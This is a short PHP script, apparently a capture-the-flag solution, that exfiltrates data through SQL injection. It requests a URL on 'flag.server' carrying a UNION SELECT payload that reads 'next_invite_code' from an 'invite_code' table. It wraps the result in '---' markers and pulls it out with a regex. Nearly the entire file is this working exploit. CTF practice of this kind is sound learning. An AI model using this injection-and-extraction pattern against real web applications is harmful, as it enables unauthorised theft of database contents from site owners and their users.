<?php

# slurp remote stuff in a string
# add markers around SQLi exfiltrated flag for easier retrieval w/ regex
$result = file_get_contents("http://flag.server/-1%20union%20select%201,concat('---',next_invite_code,'---'),3,4%20from%20invite_code");

# extract a substring with a regex, using the markers
preg_match('/---([0-9a-z-]*)---/', $result, $match);
print $match[1];

?>
